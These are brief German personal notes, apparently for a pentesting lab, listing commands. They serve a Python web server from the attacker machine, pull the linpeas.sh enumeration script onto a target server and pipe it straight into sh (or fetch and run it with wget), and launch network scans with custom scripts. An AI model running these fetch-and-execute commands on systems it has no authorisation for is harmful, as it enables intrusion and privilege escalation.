#### Python Webserver Aufmachen
Im Home Pfad
`python3 -m http.server`
Port ist 8000

Aufm Server für linpeas holen
`curl http://0.0.0.0:8000/Cyber/Tools/linpeas.sh | sh`
oder
`wget <myIP>:8000/Cyber/Tools/linpeas.sh`
`./linpeas.sh`

#### Netzwerk Scan
Recool starten
`python3 recool.py -I eth1 -s /home/kali/Cyber/scanResults --nplan-path /home/kali/go/bin/nplan -u`

Ivo starten
`nmapScenarioScan.py eth1`